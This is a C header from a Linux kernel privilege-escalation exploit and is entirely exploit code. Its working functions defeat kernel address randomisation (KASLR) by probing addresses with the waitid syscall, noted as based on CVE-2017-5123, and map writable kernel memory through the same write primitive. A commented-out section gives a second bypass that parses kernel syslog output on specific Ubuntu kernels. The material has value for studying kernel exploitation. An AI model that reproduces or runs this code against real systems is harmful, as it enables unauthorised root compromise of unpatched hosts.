#ifndef _kaslr_bypass_h
#define _kaslr_bypass_h
#include "./kernel_infos.h"
// where read/write data is in kernel
// had to play with last 3 nibbles to get it to not crash

unsigned long kernel_base;

// based on CVE-2017-5123
#define start_rw_off 0x8df000
unsigned long get_kernel_base() {
  unsigned long start = 0xffffffff00000000;
  unsigned long inc =   0x0000000000100000;
  unsigned long guess = start;
  while (guess != 0) {
    int res = syscall(SYS_waitid, P_ALL, 0, guess + start_rw_off, WEXITED, NULL);
    if (errno != 14) {
      printf("found kernel base 0x%lx\n", guess);
      kernel_base = guess;
      return guess;
    }
    
    guess += inc;
  }
  printf("failed to find base address...");
  return -1;
}

void locate_first_writable() {
	// first we try doing our arb write to find the system base address
	// if syscall is 0 we didn't fault
	
	unsigned long start = 0xffffffff81000000;
	unsigned long inc =   0x0000000000000010;
	unsigned long last =  0xfffffffff0000000;

	unsigned long guess = start;
	size_t count = 0;
	size_t w_start = 0;
	size_t w_end = 0;
	while (guess != 0) {
		int res = syscall(SYS_waitid, P_ALL, 0, guess, WEXITED, NULL);
		if (w_start == 0){
			if(errno != 14){
				w_start = guess;
				count ++;
			}
		}
		else{
			if(errno == 14){
				// guess - inc is the end of the writeable position.
				printf("[NO.%lu] %p - %p area is writable.\n", count, w_start, (guess - inc));
				w_start = 0;
			}
		}
		guess += inc;
		if(guess >= last)
			break;
	}
	return;
}

/* * * * * * * * * * * * * * syslog KASLR bypass * * * * * * * * * * * * * *
// We don't have permission to do klogctl in Docker.

#define SYSLOG_ACTION_READ_ALL 3
#define SYSLOG_ACTION_SIZE_BUFFER 10

void mmap_syslog(char** buffer, int* size) {
	*size = klogctl(SYSLOG_ACTION_SIZE_BUFFER, 0, 0);
	if (*size == -1) {
		perror("[-] klogctl(SYSLOG_ACTION_SIZE_BUFFER)");
		exit(EXIT_FAILURE);
	}

	*size = (*size / getpagesize() + 1) * getpagesize();
	*buffer = (char*)mmap(NULL, *size, PROT_READ | PROT_WRITE,
				   MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

	*size = klogctl(SYSLOG_ACTION_READ_ALL, &((*buffer)[0]), *size);
	if (*size == -1) {
		perror("[-] klogctl(SYSLOG_ACTION_READ_ALL)");
		exit(EXIT_FAILURE);
	}
}

unsigned long get_kernel_addr_trusty(char* buffer, int size) {
	const char* needle1 = "Freeing unused";
	char* substr = (char*)memmem(&buffer[0], size, needle1, strlen(needle1));
	if (substr == NULL) {
		fprintf(stderr, "[-] substring '%s' not found in syslog\n", needle1);
		exit(EXIT_FAILURE);
	}

	int start = 0;
	int end = 0;
	for (end = start; substr[end] != '-'; end++);

	const char* needle2 = "ffffff";
	substr = (char*)memmem(&substr[start], end - start, needle2, strlen(needle2));
	if (substr == NULL) {
		fprintf(stderr, "[-] substring '%s' not found in syslog\n", needle2);
		exit(EXIT_FAILURE);
	}

	char* endptr = &substr[16];
	unsigned long r = strtoul(&substr[0], &endptr, 16);

	r &= 0xffffffffff000000ul;

	return r;
}

unsigned long get_kernel_addr_xenial(char* buffer, int size) {
	const char* needle1 = "Freeing unused";
	char* substr = (char*)memmem(&buffer[0], size, needle1, strlen(needle1));
	if (substr == NULL) {
		fprintf(stderr, "[-] substring '%s' not found in syslog\n", needle1);
		exit(EXIT_FAILURE);
	}

	int start = 0;
	int end = 0;
	for (start = 0; substr[start] != '-'; start++);
	for (end = start; substr[end] != '\n'; end++);

	const char* needle2 = "ffffff";
	substr = (char*)memmem(&substr[start], end - start, needle2, strlen(needle2));
	if (substr == NULL) {
		fprintf(stderr, "[-] substring '%s' not found in syslog\n", needle2);
		exit(EXIT_FAILURE);
	}

	char* endptr = &substr[16];
	unsigned long r = strtoul(&substr[0], &endptr, 16);

	r &= 0xfffffffffff00000ul;
	r -= 0x1000000ul;

	return r;
}

unsigned long get_kernel_addr(int kernel) {
	char* syslog;
	int size;
	mmap_syslog(&syslog, &size);

	if (strcmp("14.04", kernels[kernel].distro) == 0 &&
	    strncmp("4.4.0", kernels[kernel].version, 5) == 0)
		return get_kernel_addr_trusty(syslog, size);
	if (strcmp("16.04", kernels[kernel].distro) == 0 &&
	    strncmp("4.8.0", kernels[kernel].version, 5) == 0)
		return get_kernel_addr_xenial(syslog, size);

	printf("[-] KASLR bypass only tested on trusty 4.4.0-* and xenial 4-8-0-*");
	exit(EXIT_FAILURE);
}
*/

#endif
